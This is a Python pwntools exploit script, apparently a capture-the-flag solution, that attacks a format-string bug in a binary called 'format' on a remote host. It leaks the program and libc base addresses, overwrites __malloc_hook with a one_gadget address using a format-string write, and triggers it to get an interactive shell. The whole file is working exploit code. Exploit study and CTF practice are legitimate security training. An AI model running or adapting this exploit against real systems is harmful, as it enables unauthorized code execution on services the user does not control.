#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './format'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc6_2.27-3ubuntu1_amd64.so'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '157.245.39.76', 32660

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = initialize()

# leaking elf base address
io.sendline(b'%37$lx')
elf.address = int(io.recvline().strip(), 16) - (elf.sym['init'] + 117)

# leaking libc base address
offset = 6
io.sendline(flat([f'____%{offset+1}$s', elf.got['printf']]))
printf = u64(io.recv(10)[4:].strip().ljust(8, b'\x00'))
libc.address = printf - libc.sym['printf']

one_gadget_1 = 0x4f2c5
one_gadget_2 = 0x4f322
one_gadget_3 = 0x10a38c

# overwrite __malloc_hook with one gadget
payload = fmtstr_payload(6, {libc.address + 0x3ebc30: libc.address + one_gadget_2})
io.sendline(payload)

# make a large printf to trigger __malloc_hook
# printf will allocate a heap instead of immedieately 
# print to stdout if a buffer is large enough
io.sendline('%100000c')

info('elf base addr: %#x', elf.address)
info('libc base addr: %#x', libc.address)
info('one gadget used: %#x', libc.address + one_gadget_2)

io.interactive()